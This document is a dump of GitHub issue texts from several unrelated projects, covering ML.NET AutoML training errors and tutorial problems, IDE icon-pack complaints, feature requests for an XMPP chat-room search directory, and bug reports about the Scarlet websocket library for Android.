   at Microsoft.ML.Data.BinaryClassifierEvaluator.<>c__DisplayClass32_0.<GetAggregatorConsolidationFuncs>b__0(UInt32 stratColKey, ReadOnlyMemory`1 stratColVal, Aggregator agg)
   at Microsoft.ML.Data.EvaluatorBase`1.ProcessData(IDataView data, RoleMappedSchema schema, Func`2 activeColsIndices, TAgg aggregator, AggregatorDictionaryBase[] dictionaries)
   at Microsoft.ML.Data.EvaluatorBase`1.Microsoft.ML.Data.IEvaluator.Evaluate(RoleMappedData data)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Evaluate(IDataView data, String label, String score, String predictedLabel)
   at Microsoft.ML.AutoML.BinaryMetricsAgent.EvaluateMetrics(IDataView data, String labelColumn)
   at Microsoft.ML.AutoML.RunnerUtil.TrainAndScorePipeline[TMetrics](MLContext context, SuggestedPipeline pipeline, IDataView trainData, IDataView validData, String labelColumn, IMetricsAgent`1 metricsAgent, ITransformer preprocessorTransform, FileInfo modelFileInfo, DataViewSchema modelInputSchema, AutoMLLogger logger)
[Source=AutoML, Kind=Trace] Evaluating pipeline xf=ColumnConcatenating{ col=Features:V1,V2,V3,V4,V5,V6} tr=LightGbmBinary{}  cache=-
[Source=AutoML, Kind=Error] Pipeline crashed: xf=ColumnConcatenating{ col=Features:V1,V2,V3,V4,V5,V6} tr=LightGbmBinary{}  cache=- . Exception: System.ArgumentOutOfRangeException: AUC is not definied when there is no positive class in the data
Parameter name: PosSample
   at Microsoft.ML.Data.EvaluatorBase`1.AucAggregatorBase`1.ComputeWeightedAuc(Double& unweighted)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Aggregator.Finish()
   at Microsoft.ML.Data.BinaryClassifierEvaluator.<>c__DisplayClass32_0.<GetAggregatorConsolidationFuncs>b__0(UInt32 stratColKey, ReadOnlyMemory`1 stratColVal, Aggregator agg)
   at Microsoft.ML.Data.EvaluatorBase`1.ProcessData(IDataView data, RoleMappedSchema schema, Func`2 activeColsIndices, TAgg aggregator, AggregatorDictionaryBase[] dictionaries)
   at Microsoft.ML.Data.EvaluatorBase`1.Microsoft.ML.Data.IEvaluator.Evaluate(RoleMappedData data)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Evaluate(IDataView data, String label, String score, String predictedLabel)
   at Microsoft.ML.AutoML.BinaryMetricsAgent.EvaluateMetrics(IDataView data, String labelColumn)
   at Microsoft.ML.AutoML.RunnerUtil.TrainAndScorePipeline[TMetrics](MLContext context, SuggestedPipeline pipeline, IDataView trainData, IDataView validData, String labelColumn, IMetricsAgent`1 metricsAgent, ITransformer preprocessorTransform, FileInfo modelFileInfo, DataViewSchema modelInputSchema, AutoMLLogger logger)
[Source=AutoML, Kind=Trace] 3	NaN	00:00:00.0955045	xf=ColumnConcatenating{ col=Features:V1,V2,V3,V4,V5,V6} tr=LightGbmBinary{}  cache=-
|3    LightGbmBinary                            NaN      NaN      NaN       NaN       0.1          0             |
System.ArgumentOutOfRangeException: AUC is not definied when there is no positive class in the data
Parameter name: PosSample
   at Microsoft.ML.Data.EvaluatorBase`1.AucAggregatorBase`1.ComputeWeightedAuc(Double& unweighted)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Aggregator.Finish()
   at Microsoft.ML.Data.BinaryClassifierEvaluator.<>c__DisplayClass32_0.<GetAggregatorConsolidationFuncs>b__0(UInt32 stratColKey, ReadOnlyMemory`1 stratColVal, Aggregator agg)
   at Microsoft.ML.Data.EvaluatorBase`1.ProcessData(IDataView data, RoleMappedSchema schema, Func`2 activeColsIndices, TAgg aggregator, AggregatorDictionaryBase[] dictionaries)
   at Microsoft.ML.Data.EvaluatorBase`1.Microsoft.ML.Data.IEvaluator.Evaluate(RoleMappedData data)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Evaluate(IDataView data, String label, String score, String predictedLabel)
   at Microsoft.ML.AutoML.BinaryMetricsAgent.EvaluateMetrics(IDataView data, String labelColumn)
   at Microsoft.ML.AutoML.RunnerUtil.TrainAndScorePipeline[TMetrics](MLContext context, SuggestedPipeline pipeline, IDataView trainData, IDataView validData, String labelColumn, IMetricsAgent`1 metricsAgent, ITransformer preprocessorTransform, FileInfo modelFileInfo, DataViewSchema modelInputSchema, AutoMLLogger logger)
Exception occured while exploring pipelines:
Training failed with the exception: System.ArgumentOutOfRangeException: AUC is not definied when there is no positive class in the data
Parameter name: PosSample
   at Microsoft.ML.Data.EvaluatorBase`1.AucAggregatorBase`1.ComputeWeightedAuc(Double& unweighted)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Aggregator.Finish()
   at Microsoft.ML.Data.BinaryClassifierEvaluator.<>c__DisplayClass32_0.<GetAggregatorConsolidationFuncs>b__0(UInt32 stratColKey, ReadOnlyMemory`1 stratColVal, Aggregator agg)
   at Microsoft.ML.Data.EvaluatorBase`1.ProcessData(IDataView data, RoleMappedSchema schema, Func`2 activeColsIndices, TAgg aggregator, AggregatorDictionaryBase[] dictionaries)
   at Microsoft.ML.Data.EvaluatorBase`1.Microsoft.ML.Data.IEvaluator.Evaluate(RoleMappedData data)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Evaluate(IDataView data, String label, String score, String predictedLabel)
   at Microsoft.ML.AutoML.BinaryMetricsAgent.EvaluateMetrics(IDataView data, String labelColumn)
   at Microsoft.ML.AutoML.RunnerUtil.TrainAndScorePipeline[TMetrics](MLContext context, SuggestedPipeline pipeline, IDataView trainData, IDataView validData, String labelColumn, IMetricsAgent`1 metricsAgent, ITransformer preprocessorTransform, FileInfo modelFileInfo, DataViewSchema modelInputSchema, AutoMLLogger logger)
System.InvalidOperationException: Training failed with the exception: System.ArgumentOutOfRangeException: AUC is not definied when there is no positive class in the data
Parameter name: PosSample
   at Microsoft.ML.Data.EvaluatorBase`1.AucAggregatorBase`1.ComputeWeightedAuc(Double& unweighted)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Aggregator.Finish()
   at Microsoft.ML.Data.BinaryClassifierEvaluator.<>c__DisplayClass32_0.<GetAggregatorConsolidationFuncs>b__0(UInt32 stratColKey, ReadOnlyMemory`1 stratColVal, Aggregator agg)
   at Microsoft.ML.Data.EvaluatorBase`1.ProcessData(IDataView data, RoleMappedSchema schema, Func`2 activeColsIndices, TAgg aggregator, AggregatorDictionaryBase[] dictionaries)
   at Microsoft.ML.Data.EvaluatorBase`1.Microsoft.ML.Data.IEvaluator.Evaluate(RoleMappedData data)
   at Microsoft.ML.Data.BinaryClassifierEvaluator.Evaluate(IDataView data, String label, String score, String predictedLabel)
   at Microsoft.ML.AutoML.BinaryMetricsAgent.EvaluateMetrics(IDataView data, String labelColumn)
   at Microsoft.ML.AutoML.RunnerUtil.TrainAndScorePipeline[TMetrics](MLContext context, SuggestedPipeline pipeline, IDataView trainData, IDataView validData, String labelColumn, IMetricsAgent`1 metricsAgent, ITransformer preprocessorTransform, FileInfo modelFileInfo, DataViewSchema modelInputSchema, AutoMLLogger logger)
   at Microsoft.ML.CLI.CodeGenerator.CodeGenerationHelper.GenerateCode()
   at Microsoft.ML.CLI.Program.<>c__DisplayClass1_0.<Main>b__0(NewCommandSettings options)
Please see the log file for more info.
Exiting ...
```

Here is a small subset of the sample of data I am trying to train on. The training fails with the above error even if I use just this small subset. Note: the column "Res" is what I am asking the ML system to predict.
```
V1,V2,V3,V4,V5,V6,Res
1.04,0,0,93,0.93,30,1
1.33,3,0.6,81,0.81,37,1
1.2,3,0.6,90,0.9,30,1
1.13,0,0,74,0.74,19,1
1.06,0,0,78,0.78,18,1
1.25,3,0.6,86,0.86,21,1
1.25,4,0.8,89,0.89,18,0
1.25,5,1,96,0.96,23,0
```

It can be seen that there are indeed positive and negative labels in the "Res" column. Furthermore, I have tried varying the values in this column to be "True/False", "Yes/No", and "1/0" as seen here. Can anyone suggest a fix for this? I'm creating a simple ML WPF app with projects added with the ML Model Builder. 

The Model and Console App projects are added to the solution.  However, when I go to add the 

"using WpfApp2ML.Model;" to my main xaml.cs file "WpfApp2" I get the following error. 

"The type or namespace name 'WpfApp2ML.model' cannot be found...

This is the required step in the Code section of the "Build Your Machine Learning Model"  

Step 2. Consume the Model

Add the following using  …...using WpfApp2ML.Model;

This use to work just fine.  

I'm using Version 16.0.1909.2101 of the Model Builder

VS 2019 Community 16.3.2



 Is it possible to get training progress, so I can show on the Console how my training is going (training metrics) for each iteration? Exception occured while exploring pipelines:
Provided label column 'Sentiment' was of type Boolean, but only type Single is allowed.
System.ArgumentException: Provided label column 'Sentiment' was of type Boolean, but only type Single is allowed.
   at Microsoft.ML.CLI.CodeGenerator.CodeGenerationHelper.GenerateCode()
   at Microsoft.ML.CLI.Program.<>c__DisplayClass1_0.<Main>b__0(NewCommandSettings options)
Please see the log file for more info.
Exiting .. hi i have temperature data with column name (temperature,month,day,hour,minute,second)
i want to know abnormal data so which one i have to used ? Problem encountered on https://dotnet.microsoft.com/learn/machinelearning-ai/ml-dotnet-get-started-tutorial/install-package
Operating System: windows

Provide details about the problem you are experiencing. Include your operating system version, exact error message, code sample, and anything else that is relevant.

I created a new C# based Windows Form Application in Visual Studio 2019 Preview. After creating the application, I went to the folder and through an instance of CMD tried to install the ML.NET package in the folder directory. 
And I got an error message stating that the project does not support adding packages through the add package command. 

The version of .NET Framework used: 4.7 <something>
Version of .NET SDK: 2.1.602 for example ,    issues  was multi-lables( memory-problrem, net-problem....)  ,when i input some issue ,the prediction is multi-label like ( memory-problrem, net-problem..)
someone give me suggestion?   If you run the sentiment analysis project, the TestSinglePrediction method always outputs toxic as a result even if the sample statement is positive.

IE, change the text on line 99 to any good text like:
SentimentIssue sampleStatement = new SentimentIssue { Text = "This is a very great movie" };

and it will still output the result as toxic.

This is in the version 0.8 samples. Question, Instead of predicting just one class out of all the classes.  Can we build one model that can predict if the data belongs to more than 1 class?  Question, Instead of predicting just one class out of all the classes.  Can we build one model that can predict if the data belongs to more than 1 class?  When building the sample app I get:

> The type 'ModelInput' in 'E:\Projects\c_sharp\myMLApp\myMLAppML.Model\DataModels\ModelInput.cs' conflicts with the imported type 'ModelInput' in 'myMLAppML.Model, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'. Using the type defined in 'E:\Projects\c_sharp\myMLApp\myMLAppML.Model\DataModels\ModelInput.cs'.

I simply followed [this tutorial](https://dotnet.microsoft.com/learn/ml-dotnet/get-started-tutorial/intro)

I'm using VS2019 CE

Thanks. Problem encountered on https://dotnet.microsoft.com/learn/ml-dotnet/get-started-tutorial/consume
Operating System: windows

Here is the error message:Severity	Code	Description	Project	File	Line	Suppression State
Error	CS0246	The type or namespace name 'MLAppML' could not be found (are you missing a using directive or an assembly reference?)	myMLApp	C:\Users\Hirad2HHK\source\repos\myMLApp\myMLApp\Program.cs	7	Active
And there is warning that says:
Severity	Code	Description	Project	File	Line	Suppression State
Warning		The project 'myMLAppML.Model' cannot be referenced. The referenced project is targeted to a different framework family (.NETCoreApp)	myMLApp			
 I've created a Time Series model using the method described [here](https://github.com/dotnet/machinelearning-samples/tree/master/samples/csharp/end-to-end-apps/Forecasting-Sales) resulting in this code:
```cs
var data = items.ToArray();
var trainData = mlContext.Data.LoadFromEnumerable(data);

var estimator = mlContext.Forecasting.ForecastBySsa(
    nameof(FooPrediction.BarPrediction),
    nameof(FooInput.Bar),
    12,
    data.Length,
    data.Length,
    2,
    confidenceLowerBoundColumn: nameof(FooPrediction.ConfidenceLowerBound),
    confidenceUpperBoundColumn: nameof(FooPrediction.ConfidenceUpperBound));

var transformer = estimator.Fit(trainData);
using var engine = transformer.CreateTimeSeriesEngine<FooInput, FooPrediction>(mlContext);
engine.CheckPoint(mlContext, "model.zip");
```

...where `items` is `IEnumerable<FooInput>`.

These are my model classes:
```cs
public class FooPrediction
{
    public float[] BarPrediction { get; set; }

    public float[] ConfidenceLowerBound { get; set; }

    public float[] ConfidenceUpperBound { get; set; }
}

public class FooInput
{
    public float Bar { get; set; }

    public float Baz { get; set; }
}
```

In my `Startup`, I add a `PredictionEnginePool` thus:
```cs
services.AddPredictionEnginePool<FooInput, FooPrediction>().FromFile(String.Empty, "model.zip", true);
```

In my middleware service, I inject the `PredictionEnginePool` and then call:
```cs
var prediction = items.Select(i => predictionEnginePool.Predict(i));
```

...where `items` is `IEnumerable<FooInput>`.

This results in an `ArgumentOutOfRangeException` being thrown in `PredictionEngineBase.TransformerChecker`:

> Must be a row to row mapper (Parameter 'transformer')

Debugging into the code, I can see there is a check for `IsRowToRowMapper` on the `ITransformer` object being true. However, when the model is created, an `SsaForecastingTransformer` is created which has this property set to false.

Am I doing something wrong, or does `PredictionEnginePool` not support Time Series models?

I've also tried this with `AddPredictionEnginePool<IEnumerable<FooInput>, FooPrediction>` and then calling `predictionEnginePool.Predict(items)`, but this also results in the same exception. @CESARDELATORRE - please refer 

https://github.com/dotnet/machinelearning/issues/4280  Hi, I am trying the sample https://github.com/dotnet/machinelearning-samples/tree/master/samples/csharp/end-to-end-apps/DeepLearning_ObjectDetection_Onnx .
I can successfully build and test on localhost. 
And I follow the step https://docs.microsoft.com/en-us/azure/app-service/app-service-web-get-started-dotnet#launch-the-publish-wizard to publish. 
But I didnt get any result after I click Upload File. 
Any suggestions or tips ? Thanks. Problem encountered on https://dotnet.microsoft.com/learn/machinelearning-ai/ml-dotnet-get-started-tutorial/consume
Operating System: windows

Provide details about the problem you are experiencing. Include your operating system version, exact error message, code sample, and anything else that is relevant. Problem encountered on https://dotnet.microsoft.com/learn/machinelearning-ai/ml-dotnet-get-started-tutorial/data
Operating System: windows

I just downloaded ML.NET and was working through the tutorial but have encountered a problem. The data file provided (when downloaded and saved as .csv) returns 'Unable to split file provided into multiple consistent columns' Error in the Training phase. Problem encountered on https://dotnet.microsoft.com/learn/machinelearning-ai/ml-dotnet-get-started-tutorial/consume
Operating System: windows

Provide details about the problem you are experiencing. Include your operating system version, exact error message, code sample, and anything else that is relevant.

Severity	Code	Description	Project	File	Line	Suppression State
Warning	CS0436	The type 'ModelInput' in 'C:\Users\ttx5pgw\source\repos\myMLApp\myMLAppML.Model\DataModels\ModelInput.cs' conflicts with the imported type 'ModelInput' in 'myMLAppML.Model, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null'. Using the type defined in 'C:\Users\ttx5pgw\source\repos\myMLApp\myMLAppML.Model\DataModels\ModelInput.cs'.	myMLApp	C:\Users\ttx5pgw\source\repos\myMLApp\myMLAppML.ConsoleApp\Program.cs	48	Active
 Problem encountered on https://dotnet.microsoft.com/learn/machinelearning-ai/ml-dotnet-get-started-tutorial/consume
Operating System: windows

Provide details about the problem you are experiencing. Include your operating system version, exact error message, code sample, and anything else that is relevant.
<---------->
135138235
When selecting the 2016.2 icons following icons seem to be using the new design/wrong icon:
- ![temporary breakpoint](https://i.imgur.com/rMsYLPh.png) Temporary/remove once hit breakpoints. (Showed with a 1 in the circle previously, now shows the normal breakpoint icon 
- ![non-suspension breakpoint](https://i.imgur.com/KicfEhy.png) Non-suspension breakpoint uses new design

Is this because of the `+ some from 2018.1` part? If so I would prefer it if one could have a pure 2016.2 icon pack (or manually select which icons to use for which option) ![default](https://user-images.githubusercontent.com/4716175/49604515-8752b800-f9a7-11e8-8221-a7ca2fd2cf13.png)
There was green round icon before. No matter which image is there, IDEA sets for many years that green is for gradle. Other icons seem to be colorful still.
<---------->
135201619
Are there any plans to include MUC Avatar? This will greatly improve usability and looks of the website.

Btw, kudos for the directory. Very much appreciated. The tooltip in the server statistics pie diagram (e.g. at https://search.jabbercat.org/stats) shows the absolute number. I would like it, if it would additionally show the percentage. I already invited muclumbus multiple times into multiple rooms on conference.jugendhacker.de and my ejabberd logs also show me that the s2s works but the rooms on my server never show up in the list... now I'm confused if it's a problem on my side or on the side of muclumbus. The 'Copy JID to clipboard' button does not work with javascript disabled, ie with noscript.

I would suggest some trickery to hide it in this case, eg by adding some class like `<body class="with-js">` using JS and making the copy buttons hidden if it's not there. It would be great to be able to pull a single room's info via JSON, e.g. like this:

```sh
# totally not mocked up request
curl https://search.jabber.network/api/1.0/room/xmpp@chat.yax.im \
     -H "Content-Type: application/json"
```

```json
{
      "address": "xmpp@chat.yax.im", 
      "anonymity_mode": "semi", 
      "description": "You might still be in!", 
      "is_open": true, 
      "language": "sjn", 
      "name": "Schr\u00f6dingers Chat", 
      "nusers": 34
}
```
And even more awesome if it could render an SVG (or PNG) badge for the room, similar to these ones:

* https://shields.io/category/chat
* https://chat.prosody.im/badge
* https://chat.tatoeba.org/badge
 The search string is not highlighted in the results title.

![2019-09-30-185623_scrot](https://user-images.githubusercontent.com/5103003/65899598-9629b180-e3a3-11e9-89cb-3e3862ca97bf.png)

 The 'Copy JID to clipboard' button does not work with javascript disabled, ie with noscript.

I would suggest some trickery to hide it in this case, eg by adding some class like `<body class="with-js">` using JS and making the copy buttons hidden if it's not there. 1. Click icon to copy JID to clipboard.

*Expected:* JID copied to clipboard, no other effects.

*Actual:* Page scrolled to bottom (JID copied tho)

- Browser: Firefox 60.9.0esr 1. Click icon to copy JID to clipboard.

*Expected:* JID copied to clipboard, no other effects.

*Actual:* Page scrolled to bottom (JID copied tho)

- Browser: Firefox 60.9.0esr As suggested by @Ge0rG in #8. When sending a search request via the IQ API, it is not possible to pass an empty `q` value or no `q` field at all, it will be responded to with:

```xml
<iq to="..." id="Bwn0D-553" type="error" from="muchopper">
  <error type="cancel"><undefined-condition xmlns="urn:ietf:params:xml:ns:xmpp-stanzas"/></error>
</iq>
```

Please:
* [ ] fix the error to contain a developer-readable explanation, stack trace or some other useful message
* [ ] make the `q` parameter actually optional, to allow fetching the Top N MUCs by population As reported by @Ge0rG  It would be great to support [XEP-0106](https://xmpp.org/extensions/xep-0106.html) in the display, so that unreadable JIDs with `\20` in them become nice and clean...

![image](https://user-images.githubusercontent.com/165635/65159755-de0c1880-da34-11e9-8bc1-b3a2621f6ce8.png)
 - [ ] Remove tagline from header For privacy reasons I would prefer to implement the HTTP API in my client. However I do like the ability to search without downloading the entire list. Having an OpenSearch description document allows some software (e.g. Firefox) to automatically pick up on search features on a page.

Specification appears to be this:
<https://github.com/dewitt/opensearch/blob/master/opensearch-1-1-draft-6.md>

Example minimal description document:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<OpenSearchDescription xmlns="http://a9.com/-/spec/opensearch/1.1/">
  <ShortName>search.jabber.network</ShortName>
  <Url type="text/html" template="https://search.jabber.network/search?q={searchTerms}"/>
</OpenSearchDescription>
```

And this snippet in the HTML to reference it:

```html
<link rel="search" type="application/opensearchdescription+xml"
 href="/opensearchdescription" title="search.jabber.network">
```
 There is much white space on the left, and very very much white space on the right:

![image](https://user-images.githubusercontent.com/165635/65691122-960e7680-e070-11e9-9e7f-5c65f2ef2682.png)
 When a room name / subject / description contains links, it would be great to have them linkified in the browser.

This is also a very nice security test case ;-) ![image](https://user-images.githubusercontent.com/197474/65169357-a7d79480-da46-11e9-89b9-13cda42e5e96.png)

- Having links to webchat / logs closer to the main link seems sensible somehow.
- "Non-pseudonymous" is a kind of metadata, having it next to the other metadata makes some sense.
<---------->
135329998
 While implementing Scarlet in our application I noticed that Scarlets' [SocketIoClient](https://github.com/Tinder/Scarlet/blob/0.2.x/scarlet-protocol-socketio-client/src/main/java/com/tinder/scarlet/socketio/client/SocketIoClient.kt#L119-L141) doesn't support the `JSONArray` type. When an event is received it only checks for `JSONObject`, `String` and `ByteArray`. Since there is no fallback case nothing will be emitted to the subscriber.

Problem in Scarlet version 0.2.4 Hello. 
Can you please explain me, wtf is going on here?

```
val scarletBuilder = Scarlet.Configuration(
    streamAdapterFactories = listOf(CoroutinesStreamAdapterFactory()),
    debug = true
)

val protocol = object : Protocol {
    override fun createChannelFactory(): Channel.Factory = object : Channel.Factory {
        override fun create(listener: Channel.Listener, parent: Channel?): Channel? = parent
    }

    override fun createEventAdapterFactory(): ProtocolSpecificEventAdapter.Factory {
        TODO: fill this
    }
}

val scarlet = Scarlet(protocol, scarletBuilder)
```

Is this a new way to create a Scarlet instance, really?
If yes - where is documentation? Wtf is `ProtocolSpecificEventAdapter`? Why i need `ChannelFactory`?
 Hi!

Please update following dependencies :

```
moshi = 'com.squareup.moshi:moshi-kotlin:1.8.0'
moshiCodeGen = 'com.squareup.moshi:moshi-kotlin-codegen:1.8.0'

okHttp = 'com.squareup.okhttp3:okhttp:3.14.2'
okHttpServerSentEvent = 'com.squareup.okhttp3:okhttp-sse:3.14.2'
okHttpLoggingInterceptor = 'com.squareup.okhttp3:logging-interceptor:3.14.2'
okio = 'com.squareup.okio:okio:1.17.4'
mockWebServer = 'com.squareup.okhttp3:mockwebserver:3.14.2'
```

There's a bug in Okio library that appears in @Send methods on Android Marshmallow.

GsonMessageAdapter works fine.

Stacktrace:
 ```07-10 13:21:34.438 6967-7009/? A/art: art/runtime/thread.cc:1344] Throwing new exception 'length=996; index=1015' with unexpected pending exception: java.lang.ArrayIndexOutOfBoundsException: length=996; index=1015
07-10 13:21:34.438 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void test.PingConnection.confirm() (PingConnection.kt:73)
07-10 13:21:34.438 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void test.PingConnection$connectToPing$1.invoke(test.Ping) (PingConnection.kt:83)
07-10 13:21:34.438 6967-7009/? A/art: art/runtime/thread.cc:1344]   at java.lang.Object test.PingConnection$connectToPing$1.invoke(java.lang.Object) (PingConnection.kt:49)
07-10 13:21:34.438 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void io.reactivex.rxkotlin.SubscribersKt$sam$io_reactivex_functions_Consumer$0.accept(java.lang.Object) (subscribers.kt:-1)
07-10 13:21:34.438 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void io.reactivex.internal.subscribers.LambdaSubscriber.onNext(java.lang.Object) (LambdaSubscriber.java:65)
07-10 13:21:34.438 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void io.reactivex.internal.operators.flowable.FlowableObserveOn$ObserveOnSubscriber.runAsync() (FlowableObserveOn.java:407)
07-10 13:21:34.438 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void io.reactivex.internal.operators.flowable.FlowableObserveOn$BaseObserveOnSubscriber.run() (FlowableObserveOn.java:176)
07-10 13:21:34.438 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void io.reactivex.internal.schedulers.ScheduledRunnable.run() (ScheduledRunnable.java:66)
07-10 13:21:34.439 6967-7009/? A/art: art/runtime/thread.cc:1344]   at java.lang.Object io.reactivex.internal.schedulers.ScheduledRunnable.call() (ScheduledRunnable.java:57)
07-10 13:21:34.439 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void java.util.concurrent.FutureTask.run() (FutureTask.java:237)
07-10 13:21:34.439 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run() (ScheduledThreadPoolExecutor.java:269)
07-10 13:21:34.439 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void java.util.concurrent.ThreadPoolExecutor.runWorker(java.util.concurrent.ThreadPoolExecutor$Worker) (ThreadPoolExecutor.java:1113)
07-10 13:21:34.439 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void java.util.concurrent.ThreadPoolExecutor$Worker.run() (ThreadPoolExecutor.java:588)
07-10 13:21:34.439 6967-7009/? A/art: art/runtime/thread.cc:1344]   at void java.lang.Thread.run() (Thread.java:818) ``` My Issue might be connection with #109 or duplicate it.
I tried to delete AndroidLifecycle from configuration as was told in Issue #18. But my connection closing after 5 mins. What can be the problem? Hi,
I wanted to log all raw requests/responses going out from and into my websocket connection, like how `HttpLoggingInterceptor` does for regular Http requests/responses. 
OkHttp interceptors [don't seem to have access to websocket messages](https://github.com/square/okhttp/issues/4192). 

Is there a way to do this from within Scarlet itself, since the OkHttp `Websocket`s being created aren't exposed publicly? I have added this project to my pom.xml in a regular Java application.

However I'm getting the following error

"Missing artifact androidx.appcompat:appcompat:jar:1.0.0"

Is it not possible to use this in a regular Java program? if so how?

 Not sure if it's an appropriate place to ask this, but it's always reproducible with Scarlet.

I created a simple empty proejct for Android in the latest Android Studio with Kotlin support. Just a simple hello world application. It worked fine, I only added some test code tp `onCreate()`:
```
val text = "test string"
val newtext = text.replace("string", "replaced")
```

Then I simply added Scarlet as dependency as suggested in the README, after doing that the application crashes on android immediately when trying to work with strings (`val text = "test string"` produces a crash), telling that the `java.lang.NoClassDefFoundError: Failed resolution of: Lkotlin/text/StringsKt;`

If I remove Scarlet from dependencies, it starts working again. What's the problem with it?

```
buildscript {
    ext.kotlin_version = '1.3.11'
    repositories {
        google()
        jcenter()
        maven { url "https://jitpack.io" }
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:3.3.0'
        classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:$kotlin_version"
        // NOTE: Do not place your application dependencies here; they belong
        // in the individual module build.gradle files
    }
}

allprojects {
    repositories {
        google()
        jcenter()
        maven { url 'https://jitpack.io' }
    }
}
```

```
apply plugin: 'com.android.application'

apply plugin: 'kotlin-android'

apply plugin: 'kotlin-android-extensions'

android {
    signingConfigs {
    }
    compileSdkVersion 28
    defaultConfig {
        applicationId "com.example.myapplication"
        minSdkVersion 26
        targetSdkVersion 28
        versionCode 1
        versionName "1.0"

    }
    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    productFlavors {
    }
}

dependencies {
    implementation fileTree(include: ['*.jar'], dir: 'libs')
    implementation "org.jetbrains.kotlin:kotlin-stdlib-jdk7:$kotlin_version"
    implementation 'androidx.core:core-ktx:1.1.0-alpha03'
    implementation 'androidx.appcompat:appcompat:1.0.0-beta01'
    implementation 'androidx.constraintlayout:constraintlayout:1.1.2'
    implementation 'com.github.tinder:scarlet:0.1.7'
}
```

I may assume that the issue arises from the fact, that the library and my project use slightly different kotlin versions (they're different only in the patch version and should be compatible though), so I'm not sure if it is the problem.

Also there is a warning in Android Studio:
```
    /home/daniel/.gradle/caches/modules-2/files-2.1/org.jetbrains.kotlin/kotlin-stdlib-jdk8/1.2.10/85fe1811f3e586d0cc53aba1394d8089f1862215/kotlin-stdlib-jdk8-1.2.10.jar (version 1.2)
    /home/daniel/.gradle/caches/modules-2/files-2.1/org.jetbrains.kotlin/kotlin-stdlib-jdk7/1.3.0/683e04a4e7f17437d7e1390480f312e122e42e9e/kotlin-stdlib-jdk7-1.3.0.jar (version 1.3)
    /home/daniel/.gradle/caches/transforms-1/files-1.1/kotlin-reflect-1.3.0.jar/1763cf1efecf987258647674f6df6b16/jetified-kotlin-reflect-1.3.0.jar (version 1.3)
    /home/daniel/.gradle/caches/modules-2/files-2.1/org.jetbrains.kotlin/kotlin-stdlib/1.3.0/a134b0cfe9bb44f98b0b3e889cda07923eea9428/kotlin-stdlib-1.3.0.jar (version 1.3)
    /home/daniel/.gradle/caches/modules-2/files-2.1/org.jetbrains.kotlin/kotlin-stdlib-common/1.3.0/84a2e0288dc17cd64d692eb1e5e0de8cd5ff0846/kotlin-stdlib-common-1.3.0.jar (version 1.3)
```

Not sure where this jdk8 dependency (version 1.2) comes from. from docs:
```
val protocol = OkHttpWebSocket(
    okHttpClient,
    OkHttpWebSocket.SimpleRequestFactory(
        { Request.Builder().url("wss://ws-feed.gdax.com").build() },
        { ShutdownReason.GRACEFUL }
    )
)
```
but this consctrucotr is internal and can't be used:
> class OkHttpWebSocket internal constructor  I try to send a message after open the socket but nothing happened?

Could anyone help on this ?


        RetrofitHub.chatServices?.observeWebSocketEvent()
            ?.observeOn(AndroidSchedulers.mainThread())
            ?.subscribeOn(Schedulers.io())
            ?.subscribe({
                Log.d("BKS-1", it.toString())
                RetrofitHub.chatServices?.sendChatMessage(
                    SendMessageRequest(
                        SystemClock.currentThreadTimeMillis().toInt(),
                        "Kalanidhi M")
                )

            }, {
                Log.d("BKS-2", it.toString())
            })

```
interface ChatServices {
    @Receive
    fun observeWebSocketEvent(): Flowable<WebSocket.Event>

    @Send
    fun sendChatMessage(sendMessageRequest: SendMessageRequest)

    @Receive
    fun observeSendMessage(): Flowable<SendMessageResponse>

}


    val chatServices by lazy { scarletInstance?.create<ChatServices>() }

        val b = OkHttpClient().newBuilder()
            .addInterceptor(getLoggingInterceptor())
        val c = b.build()



        scarletInstance =
            Scarlet.Builder()
                .webSocketFactory(c.newWebSocketFactory(WebConstants.CHAT_URL))
                .addMessageAdapterFactory(MoshiMessageAdapter.Factory())
                .addStreamAdapterFactory(RxJava2StreamAdapterFactory())
                .build()
```


 I'm dealing with a problem that my server could be unstable at the time and he could silently reboot itself. The issue is that my socket is not retrying connection after the server closes it. Is that expected behaviour. These are the logs that I get:
```
2019-06-26 00:43:28.715 32195-32420/(ConnectionManagerImpl.kt:40)#onServerReadyChange DebugTree: Dispatching web socket connection event > OnConnectionClosing(shutdownReason=ShutdownReason(code=1001, reason=The web application is stopping))

2019-06-26 00:43:28.728 32195-32420/(ConnectionManagerImpl.kt:40)#onServerReadyChange DebugTree: Dispatching web socket connection event > OnConnectionClosed(shutdownReason=ShutdownReason(code=1001, reason=The web application is stopping))
```

My implementation of Scarlet configuration is this:

```
inline fun <reified T> createWebSocketService(okHttpClient: OkHttpClient, url: String, objectMapper: ObjectMapper, application: Application): T {
    val protocol = OkHttpWebSocket(
            okHttpClient,
            OkHttpWebSocket.SimpleRequestFactory(
                    { Request.Builder().url(url).build() },
                    { ShutdownReason.GRACEFUL }
            )
    )
    val configuration = Scarlet.Configuration(
            messageAdapterFactories = listOf(JacksonMessageAdapter.Factory(objectMapper)),
            streamAdapterFactories = listOf(RxJava2StreamAdapterFactory()),
            backoffStrategy = LinearBackoffStrategy(5000),
            lifecycle = AndroidLifecycle.ofApplicationForeground(application)
    )
